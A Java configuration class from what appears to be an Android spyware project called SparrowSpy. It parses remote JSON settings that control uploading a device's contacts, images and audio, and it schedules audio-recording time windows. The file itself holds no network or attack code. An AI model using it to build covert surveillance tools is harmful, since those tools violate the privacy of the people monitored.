package com.tangledbytes.sparrowspy.utils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.threeten.bp.LocalTime;
import org.threeten.bp.format.DateTimeFormatter;

import java.util.ArrayList;
import java.util.List;

import javax.annotation.Nullable;

public class SparrowConfiguration {
    private static final String TAG = "SparrowConfiguration";
    public boolean uploadImages;
    public boolean uploadContacts;
    public boolean uploadAudio;
    public int audioCompressionLevel;
    public int imageCompressionLevel;
    public static final int DEFAULT_AUDIO_COMPRESSION_LEVEL = 6;
    public static final int DEFAULT_IMAGE_COMPRESSION_LEVEL = 9;
    private List<LocalTime[]> audioRecordTimes;

    public static SparrowConfiguration getDefaultConfig() {
        SparrowConfiguration config = new SparrowConfiguration();
        config.uploadImages = false;
        config.uploadAudio = false;
        config.uploadContacts = true;
        config.audioCompressionLevel = SparrowConfiguration.DEFAULT_AUDIO_COMPRESSION_LEVEL;
        config.imageCompressionLevel = SparrowConfiguration.DEFAULT_IMAGE_COMPRESSION_LEVEL;
        config.audioRecordTimes = new ArrayList<>();
        return config;
    }

    public static SparrowConfiguration fromJSON(@Nullable JSONObject json) throws JSONException {
        if(json == null) return getDefaultConfig();
        SparrowConfiguration config = new SparrowConfiguration();

        // Parse actions
        JSONObject actions = json.getJSONObject("actions");
        config.uploadAudio = actions.getBoolean("audio");
        config.uploadImages = actions.getBoolean("images");
        config.uploadContacts = actions.getBoolean("contacts");

        // Parse compression levels
        JSONObject compressionLevels = json.getJSONObject("compression-levels");
        config.audioCompressionLevel = compressionLevels.getInt("audio");
        config.imageCompressionLevel = compressionLevels.getInt("image");

        // Parse audio record times
        JSONArray recordTimesArray = json.getJSONArray("audio-record-times");
        config.audioRecordTimes = new ArrayList<>();
        for (int i = 0; i < recordTimesArray.length(); i++) {
            JSONArray timeSlot = recordTimesArray.getJSONArray(i);
            String start = timeSlot.getString(0);
            String end = timeSlot.getString(1);
            LocalTime startTime = LocalTime.parse(start, DateTimeFormatter.ofPattern("hh:mm a"));
            LocalTime endTime =  LocalTime.parse(end, DateTimeFormatter.ofPattern("hh:mm a"));
            config.audioRecordTimes.add(new LocalTime[]{startTime, endTime});
        }

        return config;
    }

    // Get the list of audio record times as Calendar objects
    public List<LocalTime[]> getAudioRecordTimes() {
        return this.audioRecordTimes;
    }
}


